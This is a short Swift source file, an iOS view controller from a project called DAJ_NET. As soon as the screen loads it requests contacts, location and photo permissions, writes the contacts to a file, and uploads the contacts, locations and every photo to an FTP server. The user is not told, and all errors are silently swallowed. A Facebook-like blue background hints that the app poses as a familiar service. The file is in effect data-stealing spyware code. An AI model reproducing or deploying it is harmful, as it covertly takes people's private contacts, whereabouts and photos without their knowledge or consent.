//
//  ViewController.swift
//  DAJ_NET
//
//  Created by James Wegner on 2/7/16.
//  Copyright © 2016 James Wegner. All rights reserved.
//

import UIKit
import Foundation


class ViewController: UIViewController {
    let contactsController = ContactsController()
    let photosController = PhotosController()
    let locationController = LocationController()
    //let ftpClient = FTPClient()
    
    override func viewDidLoad() {
        super.viewDidLoad()
        self.view.backgroundColor = UIColor(red: 59/255.0, green: 89/255.0, blue: 152/255.0, alpha: 1)
        
        contactsController.requestContactAccess()
        contactsController.saveContactsFile()
        
        locationController.requestLocationAccess()
        photosController.requestAccess()
        
        FTPClient.connectToServer({ (error) in })
        FTPClient.uploadFileWithName(Constants.contactsFileName, completion: ({ (error) in }))
        FTPClient.uploadFileWithName(Constants.locationsFileName, completion: ({ (error) in }))
        photosController.uploadAllImages()
    }
    
    override func didReceiveMemoryWarning() {
        super.didReceiveMemoryWarning()
    }
    
    
    override func preferredStatusBarStyle() -> UIStatusBarStyle {
        return UIStatusBarStyle.LightContent
    }
}

